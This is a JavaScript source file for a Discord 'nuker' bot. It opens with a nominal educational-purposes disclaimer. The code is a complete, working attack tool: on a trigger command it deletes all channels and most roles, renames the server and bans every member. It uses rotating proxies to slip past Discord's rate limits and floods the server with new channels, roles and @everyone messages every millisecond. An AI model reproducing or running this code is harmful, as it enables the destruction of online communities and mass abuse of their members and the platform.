/*
Author: Shahzain
THIS SCRIPT IS ONLY MADE FOR EDUCATIONAL PURPOSES 
THE DEVELOPER WILL NOT BE RESPONSIBLE FOR ANY DAMAGE CAUSED BY THIS SCRIPT
*/
const Discord = require('discord.js');
const fetch = require('node-fetch');
const HttpsProxyAgent = require("https-proxy-agent");
const fs = require('fs');
const config = require('./config.json');
const client = new Discord.Client();
client.login(config.token);
setTimeout(() => {
  console.log('[$] If the bot does not start up within 30 seconds that means you have been rate limited!\nTry Using a vpn in that case!')
  console.log('[$] Please do not use extreme mode without good proxies!')
  console.log(`[$] Bot link: https://discord.com/oauth2/authorize?client_id=${client.user.id}&scope=bot&permissions=8`)
  config.extremeMode ? console.log(`\x1b[34m[$] Extreme Mode ON!`) : console.log('\x1b[32m[$] Extreme Mode OFF!')
  config.extremeMode ? console.log('\x1B[31m[?] Warning: Extreme mode is not very stable so if you prefer stability over speed use normal mode!'): null;
}, 3000)
client.on('ready', () => {
  console.log(`[$] ${client.user.tag} is ready to destroy servers!`);
  client.user.setActivity(config.botStatus, {
    type: "LISTENING"
  });
});


const banMember = async (member, proxy) => {
  if (!proxy) {
    let body = { reason: config.reason }
    fetch(`https://discord.com/api/v9/guilds/${member.guild.id}/bans/${member.user.id}`, {
      method: "PUT",
      body: JSON.stringify(body),
      headers: {
        "Authorization": `Bot ${client.token}`
      },
    }).then(async data => {
      console.log(data)
      if (data.status === 204) {
        return true;
      } else {
        let randomProxy = await getRandProxy()
        banMember(member, randomProxy)
      }
    })
  } else {
    const proxyAgent = new HttpsProxyAgent(`${config.proxytype}://${proxy}`);
    const body = { reason: config.reason }
    fetch(`https://discord.com/api/v9/guilds/${member.guild.id}/bans/${member.user.id}`, {
      method: "PUT",
      body: JSON.stringify(body),
      headers: {
        "Authorization": `Bot ${client.token}`
      },
      agent: proxyAgent
    }).then(async data => {
      if (data.status === 204) {
        return true;
      } else if (data.statusText !== 'Too Many Requests') {
          let randomProxy = await getRandProxy()
          banMember(member, randomProxy)
      } else if (data.statusText == 'Too Many Requests') {
        console.log(`[$] Error: Too Many Requests`)
        setTimeout(() => {
          banMember(member)
        }, config.timeout)
      }
    })
  }
}

const getRandProxy = () => {
    return new Promise(async resolve => {
        await fs.readFile('proxies.txt', "utf-8", async function(err, data) {
            if (err) {
              throw err;
            }
            var lines = data.split('\n');
            var line = lines[Math.floor(Math.random() * lines.length)]
            resolve(line)
    })
})
}

/*const sendMessage = (channel, proxy) => {
let reqbody = {
    content: `@everyone ${config.reason}`,
    tts: false
 }
 if ( !proxy ) { 
    fetch(`https://discord.com/api/v9/channels/${channel.id}/messages`, {
        method: "POST",
        body: JSON.stringify(reqbody),
        headers: {
          "Authorization": `Bot ${client.token}`,
          "content-type": "application/json"
        }
      }).then(async data => {
          if (data.status === 200) {
              return;
          }
          let newProxyOk = await getRandProxy()
          sendMessage(channel, newProxyOk)
      })
    return;
 }
 const proxyAgent = new HttpsProxyAgent(`${config.proxytype}://${proxy}`);
 fetch(`https://discord.com/api/v9/channels/${channel.id}/messages`, {
    method: "POST",
    body: JSON.stringify(reqbody),
    headers: {
      "Authorization": `Bot ${client.token}`,
      "content-type": "application/json"
    },
    agent: proxyAgent
  }).then(async data => {
      if (data.status === 200) {
          return;
      }
      sendMessage(channel, (await getRandProxy()))
  })
}*/

client.on('message', async (message) => {
  const normalColor = "\x1b[32m"
  const extremeColor = "\x1b[34m"
  if (!message.content.startsWith(config.prefix) || !message.guild) return;
  if (message.content.startsWith(config.prefix) && message.content.includes(config.cmdName)) {
    config.extremeMode === false ? console.log(`[$] Nuking ${message.guild.name} in normal mode!`) : console.log(`[$] Nuking ${message.guild.name} in extreme mode!`)
    const guildToNuke = message.guild;
    await guildToNuke.channels.cache.forEach(c => c.delete(config.reason));
    await guildToNuke.roles.cache.filter(r => r.id !== guildToNuke.roles.everyone.id).forEach(r => r.delete(config.reason));
    await guildToNuke.setName(config.newGuildName);
    await guildToNuke.members.fetch().then(async members => members.forEach(async m => {
      if (config.extremeMode === false) {
        m.ban({ reason: config.reason })
        console.log(`${normalColor}[$] Banned ${m.user.tag}`)
      } else if (config.extremeMode === true) {
        await banMember(m);
        console.log(` ${extremeColor}[$] Banned ${m.user.tag}`)
      }
    }));
    if (config.channelSpam === true) {
      setInterval(async () => {
        const newChannel = await guildToNuke.channels.create(config.newGuildName);
        setInterval(() => {
          if (config.extremeMode === true) {
              newChannel.send(`@everyone ${config.reason}`)
        } 
        }, 1)
    }, 1)
    }
if (config.roleSpam === true) {
  setInterval(async () => {
    await guildToNuke.roles.create({
      data: {
        name: config.newGuildName
      }
    })
  }, 1)
}
  }
})
